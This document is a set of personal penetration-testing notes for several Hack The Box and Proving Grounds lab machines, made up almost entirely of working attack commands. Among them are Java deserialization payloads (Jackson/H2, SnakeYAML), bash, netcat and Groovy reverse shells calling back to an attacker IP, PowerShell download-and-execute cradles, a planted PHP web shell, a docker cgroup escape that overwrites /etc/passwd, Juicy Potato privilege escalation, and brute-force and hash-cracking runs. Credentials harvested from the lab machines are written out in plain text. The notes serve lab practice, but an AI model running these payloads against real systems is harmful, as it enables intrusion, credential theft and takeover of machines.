./jruby-9.2.7.0/bin/jruby test.rb "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.4/asd'\"}]"
python -m SimpleHTTPServer 80
	10.10.14.4 - - [23/Oct/2021 05:54:43] "GET /asd HTTP/1.1" 404 -
	#got RCE but from my machine?? 
	#try to put payload to validator website
	#exploit Jackson CVE-2019-12384 java deserialization
http://10.10.10.214/
	["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.4/asd.sql'"}]
	#got RCE, try with reverse shell
cat asd.sql
	...snap...
	CALL SHELLEXEC('bash -c "bash -i >& /dev/tcp/10.10.14.4/443 0>&1"')
>whoami
	pericles
>cd /opt/json_project/
>diff parse.rb parse.rb.orig
	f = File.read("/dev/shm/payload.txt")
	# I tought pasrse.rb will executed by root with payload from payload.txt
>cat /dev/shm/payload.txt
	["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.4/asd.sql'"}]
	#turnout its just rabbit hole (not executed by root)
>find /  -user pericles 2>/dev/null | grep -v 'proc\|mem\|cache'
	/usr/bin/timer_backup.sh
>ls -lah /usr/bin/timer_backup.sh
	-rwxrw-rw- 1 pericles pericles 88 Oct 23 10:40 /usr/bin/timer_backup.sh
	#we can write to this script
>cat /usr/bin/timer_backup.sh
	zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
	#backup website that should run by root, because it write to root directory
	#inject backup.sh to reverse shell
>echo "bash -i >& /dev/tcp/10.10.14.4/443 0>&1" >> /usr/bin/timer_backup.sh
nc -lvp 443
#whoami
	root




Ready Hackthebox
=============================================
sudo autorecon 10.10.10.220
http://10.10.10.220:5080/users/sign_in
	#try to register and can logged in
http://10.10.10.220:5080/asd
	#check gitlab version
http://10.10.10.220:5080/help
	GitLab Community Edition 11.4.7
	#exploit gitlab RCE
searchsploit gitlab 11.4
python3 49334.py -u asd -p asdasdasd -g http://10.10.10.220 -l 10.10.14.6 -P 443
>whoami
	git
	#looklike inside docker container, check environment docker container
	#there are .dockerenv in system / and ipconfig and ip not present
>find / 2>/dev/null | grep dockerenv
	/.dockerenv
	#check ip docker
>hostname -I
	172.19.0.2
	#enumerate gitlab, change password gitlab
>which gitlab-rails
>gitlab-rails runner 'User.where.not(username: "peasssssssss").each { |u| pp u.attributes }'
	#got bunch of username and hash, change password gitlab
	#https://www.youtube.com/watch?v=NgNoTVL9PRw
>cd /opt/backup
>gitlab-rails console production
	GitLab:       11.4.7 (98f8423)
>User.where(id:2).first
	=> #<User id:2 @dude>
>u.password = 'asdasdasd'
>u.password_confirmation = 'asdasdasd'
>u.save!
http://10.10.10.220:5080/dude
	#got website source code, try to enumerate and there are backdoor shell.php
	#try to enumerate is there any webiste or subdomain but found nothing
	#read config file gitlab
>cat /opt/backup/ritlab.rb
	#exclude # and grap remove blank line
>cat gitlab.rb | grep -v '^#' | tr '[:space:]' ' '
>cat gitlab.rb | grep -v "^#" | grep .
	gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
>su root
	##escape docker
	#https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
	#has SYS_ADMIN capabilities
>find / 2>/dev/null | grep capsh
>/usr/sbin/capsh --print
	..._pacct,cap_sys_admin,cap_sys_bo...
	#has priviliedge capability
>cat /root/docker-gitlab/docker-compose.yml
	...snip...
	privileged: true
>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
>mkdir -p $d/w;echo 1 >$d/w/notify_on_release
>t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
	#ps command
>touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps >'"$t/o" >/c;
>chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
	#change /etc/passwd to add rooot user
>touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\ncat /etc/passwd >'"$t/o" >/c;
>sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
>touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl http://10.10.14.6/passwd.txt -o /etc/passwd >'"$t/o" >/c;
>sh -c "echo 0 >$d/w/cgroup.procs"
ssh rooot@10.10.10.220
#whoami
	root
	#docker escape file system, docker file system escape
>whoami
	root
>lsblk
	sda      8:0    0   20G  0 disk
	├─sda1   8:1    0    1M  0 part
	├─sda2   8:2    0   18G  0 part /
	└─sda3   8:3    0    2G  0 part [SWAP]
	#looklike sda2 which 18GB are actual mount system
>mkdir /mnt/sda2
>mount /dev/sda2 /mnt/sda2/
>cd /mnt/sda2/root
>wget 10.10.14.7/passwd.txt
>cp passwd.txt /mnt/sda2/etc/passwd
ssh rooot@10.10.10.220
>whoami
	root






Delivery Hackthebox
=========================================
sudo autorecon 10.10.10.222
http://10.10.10.222/
	helpdesk.delivery.htb
http://helpdesk.delivery.htb
	#I already read article about Ticket Trick on medium and I thougt someone finally made this
	#so I use email support that contain corporation domain and register that email to internal application such as slack and gitlab
http://helpdesk.delivery.htb/open.php
	#got ticket 5417227@delivery.htb
http://helpdesk.delivery.htb/tickets.php
	#and this is internal apps, just like I thought
	#mattermost
http://delivery.htb:8065
	#create account using 5417227@delivery.htb, then open verification link open helpdesk
http://helpdesk.delivery.htb/tickets.php
http://delivery.htb:8065/internal/channels/town-square
	....to the server are maildeliverer:Youve_G0t_Mail! ......variant of "PleaseSubscribe!"....
	#got credz maildeliverer:Youve_G0t_Mail! and someone said about password variant PleaseSubscribe!
ssh maildeliverer@10.10.10.222
	#read mattermost config file
>cd /opt/mattermost/
>cat config/config.json
	"DriverName": "mysql",
	"DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost...",
>mysql -u mmuser -p
>show databases;
>use mattermost;
>show tables;
>describe Users;
>select Username,Password,Roles from Users;
	----------------------------------+--------------------------------------------------------------+--------------------------+
	| Username                         | Password                                                     | Roles                    |
	+----------------------------------+--------------------------------------------------------------+--------------------------+
	| asd                              | $2a$10$FL8XnwZJGD6LskkfyGgUzOavEcXvqiYhsGBAbxSe2nwypLImGKW6a | system_user              |
	| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | system_admin system_user |
	| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | system_user              |
	+----------------------------------+--------------------------------------------------------------+--------------------------+
	#analyze hash
https://www.tunnelsup.com/hash-analyzer/
hashid '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'
	[+] bcrypt
	#I download hashcat variant that contail complete variant
	#create password rule hashcat
wget https://github.com/initstring/passphrase-wordlist	
hashcat -r passphrase-rule2.rule pass.txt --stdout > wordlist.txt
hashcat -r /usr/share/hashcat/rules/best64.rule pass.txt --stdout > wordlist.txt
	#since there are many bycrypt variant on hashcat idk what to choose, i use john
	#crack bycrypt
john hash.txt --wordlist=wordlist.txt
	PleaseSubscribe!21
hashcat -m 3200 hash.txt password.txt -r /usr/share/hashcat/rules/best64.rule
>su root
#whoami
	root






Ophiuchi Hackthebox
=========================================
sudo autorecon 10.10.10.227
http://10.10.10.227:8080/
	Online Yaml Parser
POST /Servlet HTTP/1.1
data=a
	Due to security reason this feature has been temporarily on hold. We will soon fix the issue!
	#since its yaml, I try to change content-header to application/json
POST /Servlet HTTP/1.1
Content-Type: application/json
data=a
	500 - Internal Server Error
	org.yaml.snakeyaml.reader.StreamReader.<init>(StreamReader.java:63)
	org.yaml.snakeyaml.Yaml.load(Yaml.java:416)
	#good now I know its using snakeyaml, searching on google "snakeyaml exploit" found this website
	#https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858
	#https://www.cnblogs.com/hei-zi/p/14282727.html
	##exploit snakeyaml deserialization
http://10.10.10.227:8080/
	!!javax.script.ScriptEngineManager [
	!!java.net.URLClassLoader [[
		!!java.net.URL ["http://10.10.14.7/"]
	]]
	]
	#post using this payload
nc -lvp 80
	HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1
	User-Agent: Java/11.0.8
	#got connection back, vulnerable to deserialisation
	#first I follow this poc, create jar file and inject !!java.net.URL ["http://attacker.example/yaml-payload.jar"]
	#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Management%20Interface/README.md
git clone https://github.com/artsploit/yaml-payload.git
cd yaml-payload
cat src/artsploit/AwesomeScriptEngineFactory.java
	Runtime.getRuntime().exec("ping 10.10.14.7");
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
http://10.10.10.227:8080/
		!!java.net.URL ["http://10.10.14.7/yaml-payload.jar"]
	#but failed, try to bash payload like this poc still failed
	#https://pulsesecurity.co.nz/advisories/Insecure-YAML-Deserialisation
cat src/artsploit/AwesomeScriptEngineFactory.java
	String cmd = "bash -i >& /dev/tcp/10.10.14.7/443 0>&1";
	String b64Cmd = Base64.getEncoder().encodeToString(cmd.getBytes());
	cmd = "bash -c {echo,"+b64Cmd+"}|{base64,-d}|{bash,-i}";
	Runtime.getRuntime().exec(cmd).waitFor(30, TimeUnit.SECONDS);
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
	#then I follow sxact as this website and success
	#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Management%20Interface/README.md
cat ./META-INF/services/javax.script.ScriptEngineFactory
	artsploit.AwesomeScriptEngineFactory
	#from this, target will request GET /artsploit/AwesomeScriptEngineFactory.class
cat artsploit/AwesomeScriptEngineFactory.java
	Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQ0MyAwPiYx}|{base64,-d}|{bash,-i}");
	#compile .java file to file.class
javac artsploit/AwesomeScriptEngineFactory.java
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	#from last payload I compile, there is error so can't compile file.class and exploit wouldn't work
python -m SimpleHTTPServer 80
	10.10.10.227 - - [26/Oct/2021 04:24:28] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
	10.10.10.227 - - [26/Oct/2021 04:24:28] "GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
	10.10.10.227 - - [26/Oct/2021 04:24:28] "GET /artsploit/AwesomeScriptEngineFactory.class HTTP/1.1" 200 -
nc -lvp 443
>whoami
	tomcat
	#since tomcat user, I try to read tomcat user
>cat ~/conf/tomcat-users.xml
	<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
ssh admin@10.10.10.227
>sudo -l
	(ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
	#I really don't know binary go, wasm, etc
	#so go is golang (?) and wasm is web assembly, binary web application
>cat /opt/wasm-functions/index.go
	bytes, _ := wasm.ReadBytes("main.wasm")
	instance, _ := wasm.NewInstance(bytes)
	init := instance.Exports["info"]
	result,_ := init()
	if (f != "1") {
		fmt.Println("Not ready to deploy")
	} else {
		out, err := exec.Command("/bin/sh", "deploy.sh").Output()
	#so script will load main.wasm, if main.wasm info() function return =! 1 then run deploy.sh
	#since main.wasm and deploy.sh not using absolute path, maybe I can hijack main.wasm and deploy.sh
	#install compiler and decompiler wasm
	#https://github.com/WebAssembly/wabt
git clone --recursive https://github.com/WebAssembly/wabt
cd wabt
git submodule update --init
mkdir build
cd build
sudo cmake ..
sudo cmake --build .
	#decompile wasm.main sing wabt
wabt/build/wasm2wat main.wasm -o index.wat
cat index.wat
	(func $info (type 0) (result i32)
		i32.const 1)
	#I cant read file.wat :(
wabt/build/wasm-decompile main.wasm -o index.c
cat index.c
	export function info():int {
		return 0
	#yes there are function info(), I change value to 1 but I can't compile from file.c to wasm 
	#change file.wasm to 1
	#https://developer.mozilla.org/en-US/docs/WebAssembly/Understanding_the_text_format
cat ex.wat
	(func $info (type 0) (result i32)
		i32.const 1)
wabt/bin/wat2wasm index.wat -o ex.wasm
	#copy ex.wasm to main.wasm and change deploy.sh to suid rootbash
>cd /tmp
>cp ex.wasm main.wasm
>cat deploy.sh
	cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
>export PATH=/tmp:$PATH
>sudo /usr/bin/go run /opt/wasm-functions/index.go
>rootbash -p
#whoami
	root
#echo "admin    ALL=(ALL:ALL) ALL" >> /etc/sudoers
#exit
>sudo su
#id
	uid=0(root) gid=0(root) groups=0(root)







Nest Hackthebox
=========================================
sudo autorecon 10.10.10.178
smbclient -N \\\\10.10.10.178\\Data
>prompt OFF
>recurse ON
>mget *
cat 'Welcome Email.txt'
	Username: TempUser, Password: welcome2019
crackmapexec smb 10.10.10.178 -u user.txt -p pass.txt --continue-on-success
smbmap -H 10.10.10.178 -u l.frost -p computer2019 -R
	#user L.Frost and Thompson got nothing
	#numerate smb as TempUser
smbclient -N \\\\10.10.10.178\\Data
>prompt OFF
>recurse ON
>mget *
cat Data/IT/Configs/RU Scanner/RU_config.xml
	<Username>c.smith</Username>
	<Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
	#got c.smith password but can't deode
cat IT/Configs/NotepadPlusPlus/config.xml
	<File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
	#there are directory Carl inside Secure$ smb
	#just like webserver can't listing directory but we can grep file inside it
smbclient -N \\\\10.10.10.178\\Secure$
>cd IT
>cd Carl
>mget *
	#so I din't manage to finish from this poin, since it should export to Visual Studio and my subscription only 3 days left
	#so after export to visual studio, create print password with utils.decryptstring
	printPassword = Utils.DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")
	Console.WriteLine(printPassword)
	#got output xRxRxPANCAK3SxRxRx, credz as c.smith
crackmapexec smb -u c.smith -p xRxRxPANCAK3SxRxRx -H 10.10.10.178
smbclient -N \\\\10.10.10.178\\Users
>get "Debug Mode Password.txt"
cat "Debug Mode Password.txt"
	#empty file, download datastream (data stream) from smb
>allinfo "Debug Mode Password.txt"
	stream: [:Password:$DATA], 15 bytes
>get "Debug Mode Password.txt:Password:$DATA"
cat "Debug Mode Password.txt"
	WBQ201953D8w
telnet 10.10.10.178 4386
>debug WBQ201953D8w
>help
	#there are new command SHOWQUERY that actually read content file
>setdir ../
>setdir ldap
>list
	[2]   Ldap.conf
>showquery 2
	User=Administrator
	Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
	#got administrator hash, again I openup writeup and found need to RE HqkLdap.exe
psexec.py Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
#whoami
	nt authority\system




Netmon Hackthebox
=========================================
sudo autorecon 10.10.10.152
ftp 10.10.10.152
>anonymous
	#can access user.txt
>pwd
	257 "/users/public" is current directory.
>get user.txt
	#read netmon configuration
	#I got stuck here, so in ftp doesn't list hidden directory, but user can access to that directory
>cd "\ProgramData\Paessler\PRTG Network Monitor"
>get "PRTG Configuration.old.bak"
>get "PRTG Configuration.old"
cat PRTG\ Configuration.old.bak | grep password -A2 -B2
	<dbpassword>
	<!-- User: prtgadmin -->
	PrTg@dmin2018
	</dbpassword>
	#the actual password is PrTg@dmin2019
http://10.10.10.152/myaccount.htm?tabid=2
	#rce netmon from exploit
searchsploit -m 46527
dos2unix 46527.sh
.46527.sh -c "_ga=GA1.4.118915147.16...." -u http://10.10.10.152
	#added new user as administrator
crackmapexec smb 10.10.10.152 -u pentest -p P3nT3st!
crackmapexec winrm 10.10.10.152 -u pentest -p P3nT3st!
psexec.py 'pentest:P3nT3st!@10.10.10.152'
>whoami
	nt authority\system
	#manual exploit netmon
http://10.10.10.152/myaccount.htm?tabid=2
	Setup > Account Settings > Notifications > Ticket Notifications > execute Program
	> Program File: outfile.ps1 > Parameter: test;ping 10.10.14.7
	> Parameter: test|net user pentest p3nT3st! /add
	> Parameter: "C:\Users\Public\tester.txt;net localgroup administrators /add pentest"
	#netmon reverse shell
	#add encoder to metasploit
	#https://blog.didierstevens.com/2017/08/26/quickpost-metasploit-powershell-base64-commands/
cp powershell_base64.rb /usr/share/metasploit-framework/modules/encoders/cmd/ps_bs64.rb
	#encode nc reverse shell
cat nc.txt
	powershell.exe -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.9/nc.exe','nc.exeocess nc.exe -NoNewWindow -Argumentlist '10.10.14.9 443 -e cmd.exe'}"
	#encode powershell base64
cat cmd.txt
	powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/rev.ps1')"
cat cmd.txt | msfvenom -a x64 --platform Windows -e cmd/ps_b64
cat nc.txt | msfvenom -a x64 --platform Windows -e cmd/ps_b64
	powershell.exe -EncodedCommand <base64>
	#add to exploit or manually trigger from website
./2ex.sh -c "_ga=GA1.4.118915147.16...." -u http://10.10.10.152
nc -lvp 443
>whoami
	nt authority\system






Bart Hackthebox
======================================
sudo autorecon 10.10.10.81
http://10.10.10.81
	#redirected to forum.bart.htb
http://forum.bar.htb
	#looklike wordpress
wpscan --url http://forum.bart.htb/ -e u,ap,at,cb --plugins-detection aggressive --wp-content-dir webste
	#got nothing, stratic wordpress page
ffuf -c -u http://bart.htb/FUZZ -w /opt/directory-list-2.3-medium.txt -e .html,.php,.txt,.asp,.aspx -fc 302 -fs 158607
	monitor                 [Status: 301, Size: 147, Words: 9, Lines: 2]
http://bart.htb/monitor/index.php
http://monitor.bart.htb/?action=forgot
	#php server monitor v3.21 enumerate username and found valid user harvey
	#bruteforce csrf with hydra
hydra -l harvey -P bart-dic-lower.txt -t 60 monitor.bart.htb http-form-post "/index.php:csrf=36bd695fd918999000a766aa80a90a17a8b26db85908e5443f3c50740ac2c317&user_name=^USER^&user_password=^PASS^&action=login:F=incorrect:H=Cookie\: PHPSESSID=ndr7g22cjhoj6e2hk0put97j0p"
hydra -l user -P pass.txt target target.com http-form-post "login.php:csrf=csrfvalue&parameter=parameter:F=false string:H=Cookie\: PHPSESSID=phpsessionid"
	#bruteforce login with csrf, cruteforce csrf
git clone https://github.com/1uffyD9/loginBrute
cewl -w asd.txt -d 10 -m 3 --with-numbers http://forum.bart.htb
python3 loginBrute.py -U harvey -p dsa.txt -m post -d 'user_name=$U&user_password=$P&action=login::incorrect' -t csrf -l http://bart.htb/monitor/index.php
	#got no success, translate to lowercase, when bruteforce always transfer to lower
cat asd.txt | tr '[:upper:]' '[:lower:]' >> asd.txt
python3 loginBrute.py -U harvey -p dsa.txt -m post -d 'user_name=$U&user_password=$P&action=login::incorrect' -t csrf -l http://bart.htb/monitor/index.php
	[%] Same login page detected for 'harvey':'potter'
	#got credz harvey:potter
http://internal-01.bart.htb/#
view-source:http://internal-01.bart.htb/#
http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey
http://internal-01.bart.htb/log/log.txt
	#logging useragent
http://internal-01.bart.htb/log/log.php?filename=test.php&username=harvey
	<?php system($_GET['c']);?>
http://internal-01.bart.htb/log/test.php?c=whoami
	nt authority\iusr 
	\\10.10.14.9\asd\nc.exe+10.10.14.9+443+-e+cmd.exe
>whoami
	nt authority\iusr 
>whoami /priv
	SeImpersonatePrivilege  Impersonate a client after authentication Enabled
>systeminfo
	OS Name:                   Microsoft Windows 10 Pro
	OS Version:                10.0.15063 N/A Build 15063
	#privesc seimpersonatetoken windows 10 pro
	#list clsid http://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/
>type asd.bat
	@echo off
	C:\temp\nc.exe 10.10.14.9 443 -e cmd.exe
>jp.exe -t * -p \temp\asd.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}
nc -lvp 443
>whoami
	nt authority\system
	##after read another writeup there are another way to root
	#custom rockyou.txt with miniaml 8 character
sed -nr '/^.{8,150}$/p' /opt/rockyou.txt > rockyou8.txt
	#bruteforce internal login
hydra -l harvey -P rockyou8.txt -t 60 internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:F=Invalid Username or Password"
	#crack hash with salt
cat hash.txt
	hash:salt
	faeff13072fffdb78ec3b08427678f18295ee28b8b0befc63eea2135eee85df3:8h@tr-waswe_aT#9TaCHuPhU
hashcat -m 1410 hash.txt /opt/rockyou.txt
	#read database mysql windows
>type \inetpub\wwwroot\internal-01\simple_chat\includes\dbconnect.php
	con = @mysqli_connect('localhost', 'harvey', '!IC4nB3Th3B3st?', 'internal_chat');
>mysql -uharvey -p!IC4nB3Th3B3st? -e "show databases;"	
>mysql -uharvey -p!IC4nB3Th3B3st? -e "show tables;" internal_chat	
>mysql -uharvey -p!IC4nB3Th3B3st? -e "select * from user;" internal_chat
	1 harvey  faeff13072fffdb78ec3b08427678f18295ee28b8b0befc63eea2135eee85df3
	#autologon credentials
>reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
	#runas powershell
>$username = "BART\Administrator"
>$password = '3130438f31186fbaf962f407711faddb'
>$secstr = New-Object -TypeName System.Security.SecureString
>$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
>$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username,$secstr
>Invoke-Command -ScriptBlock {whoami} -Credential $cred -Computer localhost
	bart\administrator
>Enter-PSSession -ComputerName localhost -Credential $cred
>whoami
	bart\administrator






Jeeves Hackthebox
=========================================
sudo autorecon 10.10.10.63
cat tcp_80_http_dirb.txt
cat tcp_500000_http_dirb.txt
	#dirb 80 and 50000 nothing interesting, use larger wordlist
http://10.10.10.63/Ask-Jeeves-whatever-happened-to-32225327-270-301.jpg
	#I thought knock port or wordlist from cewl ask jeeves page, and that just me made its complicated
gobuster dir -u http://10.10.10.63/ -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  --timeout 50s -t 100 -x .php,.html,.txt,.asp,.aspx 
gobuster dir -u http://10.10.10.63:50000/ -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  --timeout 50s -t 100 -x .php,.html,.txt,.asp,.aspx 
	/askjeeves
	#jenkins 2.87 dashboard withput login, rce jenkins with jenkins reverse shell windows java
	#https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
http://10.10.10.63:50000/askjeeves/script
	String host="10.10.14.9";
	int port=443;
	String cmd="cmd.exe";
	Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
rlwrapnc -lvp 443
>whoami
	jeeves\kohsuke
>whoami /priv
>systeminfo
	OS Name:                   Microsoft Windows 10 Pro
	OS Version:                10.0.10586 N/A Build 10586
	#privesc SeImpersonatePrivilege windows 10 pro juicy potato
	#list clsid http://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/
>type asd.bat
	@echo off
	C:\temp\nc.exe 10.10.14.9 443 -e cmd.exe
>jp.exe -t * -p \temp\asd.bat -l 9001 -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
nc -lvp 443
>whoami
	nt authority\system
	#sure that was not the intended path
>winpeas.exe > jeeves-winpeas.txt
	Analyzing Keepass Files (limit 70)
    C:\Users\kohsuke\Documents\CEH.kdbx
	#abuse keepas windows
file keepas.kdbx
	keepas.kdbx: Keepass password database 2.x KDBX
keepass2john keepas.kdbx > hash.txt
john hash.txt --wordlist=/opt/rockyou.txt
	moonshine1       (keepas)
sudo apt-get install keepass2
keepass2 keepas.kdbx
	Master Password: moonshine1
	ctrl+h to show password
	#got credz administrator
crackmapexec smb 10.10.10.63 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'                                                                      130 ⨯
	SMB	10.10.10.63	445	JEEVES	[+] Jeeves\administrator aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00' Administrator@10.10.10.63
>whoami
	nt authority\system
	#search file windows search file
>dir /a-d /b /s 2>&1 | findstr /i root.txt
>where /R C:\Users\ root.txt
	#data stream windows root.txt
dir
	12/24/2017  03:51 AM                36 hm.txt
>dir /a /r
	12/24/2017  03:51 AM                36 hm.txt
										34 hm.txt:root.txt:$DATA
	#there are root.txt in data stream
	#read data stream file
>more < hm.txt:root.txt
>Get-Content -path C:\Users\Administrator\Desktop\hm.txt -stream root.txt
	#search data stream file
>Get-ChildItem -recurse | ForEach { Get-Item $_.FullName -stream * } | Where stream -ne ':$DATA'
	#exploit jenkins rce unauthicated < 2.137
	#https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html
	#https://github.com/orangetw/awesome-jenkins-rce-2019






Writeup Hcakthebox
=====================================
sudo autorecon 10.10.10.138
cat tcp_80_http_dirb.txt
	#dirb nikto found nothing
http://10.10.10.138/index.html
	#static web page, author install protection so I can't gobuster to box
	#since it was easy box so fuzzing webpage is not the path I think (?)
http://10.10.10.138/robots.txt
http://10.10.10.138/writeup/index.php
http://10.10.10.138/writeup/index.php?page=ypuffy
	#I thought will be LFI but I can't read something
http://10.10.10.138/writeup/index.php?page=ypuffy../../../../../../etc/passwd
http://10.10.10.138/writeup/index.php?page=index
http://10.10.10.138/writeup/index.php?page=php://filter/convert.base64-encode/resource=ypuffy
	#found out that I need to use wappalyzer to make it easy
http://10.10.10.138/writeup/index.php
	#open up website then found out that page build using cms made simple
searchsploit cms made simple
searchsploit -m 46635
cmsms_sqli.py -u http://10.10.10.138/writeup --crack --wordlist /usr/share/wordlists/rockyou.txt
	#got credz
ssh jkr@10.10.10.138
>id
	...dev),50(staff),10...
	#so staff group in debian allow to write to /usr/local/bin
>pspy
	#I run pspy for hours but see nothing usefull
	#trick part is when login ssh pspy got something
ssh jkr@10.10.10.138
	2019/06/17 01:37:16 CMD: UID=0    PID=3257   | run-parts --lsbsysinit /etc/update-motd.d
>cp rev.sh /usr/local/bin/run-parts
ssh jkr@10.10.10.138
nc -lvp 443
#whoami
	root






Nickel ProvingGrounds
====================================
sudo autorecon 192.168.96.99
cat tcp_21_ftp_nmap.txt
	FileZilla Server 0.9.60
	#will usefull when privesc
cat tcp_33333_http_dirb.txt
cat tcp_8089_http_dirb.txt
ffuf -c -u http://192.168.96.99:33333/list-current-FUZZ -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -fs 16
http://192.168.96.99:8089/
	#devops dashboard, link are broken
http://192.168.96.99:33333/list-running-procs
http://192.168.96.99:33333/list-current-deployments
http://192.168.96.99:33333/list-active-nodes.txt
	Cannot "GET" /list-running-procs
cat tcp_33333_http_nmap.txt 
	Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	#all error running GET, since its API maybe I should change request method (?)
	#chang reqeust to POST
http://192.168.96.99:33333/list-running-procs
	cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p  "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
	#got credz ariah:Tm93aXNlU2xvb3BUaGVvcnkxMzkK:NowiseSloopTheory139
xfreerdp /u:ariah /p:NowiseSloopTheory139 /cert:ignore /v:192.168.96.99
rdesktop -u ariah -p NowiseSloopTheory139 192.168.96.99
ssh ariah@192.168.96.99
>netstat -ano | findstr LISTENING
	TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       2000
	#I immediately try to privesc Filezilla, since it has poc like Json Hackthebox
ssh ariah@192.168.96.99 -L 14147:localhost:14147
	#I tried to run filezilla using kali box but can't even connect
	#change to windows box
ssh ariah@192.168.96.99 -L 14147:localhost:14147
	#download filezilla from official website got version 1.1.0, use it and failed to create user
	#download filezilla 0.9.60
	#https://filezilla-server.informer.com/0.9b/
	#connect to localhost 14147 and create user, now I can read C:\
	#found out that was unitentded way, here the right part
	#connect ftp with ariah user
ftp 192.168.96.99
>get Infrastructure.pdf
	#pdf password protected, crack pdf john
/usr/share/john/pdf2john.pl Infrastructure.pdf hash.txt
john hash.txt --wordlist=/opt/rockyou.txt
	#failed
cat hash.txt
	Infrastructure.pdf:
	#pdf2john failed to convert
	#crack pdf with pdfcrack
pdfcrack -f Infrastructure.pdf -w /opt/rockyou.txt
	found user-password: 'ariah4168'
	#I try to open but got nothing? something different when downloading pdf from ftp and scp, should using binarry
	#download with ftp binarry (since pdf file not assci)
ftp 192.168.96.99
>binary
>get Infrastructure.pdf
	#download pdf with scp
scp ariah@192.168.152.99:C:/ftp/Infrastructure.pdf .
	#open it now I got the page
	Temporary Command endpoint: http://nickel/?
	Backup system: http://nickel-backup/backup
	NAS: http://corp-nas/files
netstat -ano | grep LISTENING
	TCP    [::]:80                [::]:0                 LISTENING       4
	#webserver listening on local port 80
ssh ariah@192.168.96.99
>curl http://localhost/?whoami
	<!doctype html><html><body>dev-api started at 2020-10-20T10:38:24
	<pre>nt authority\system
	#rce as authority system, create user, url encoded
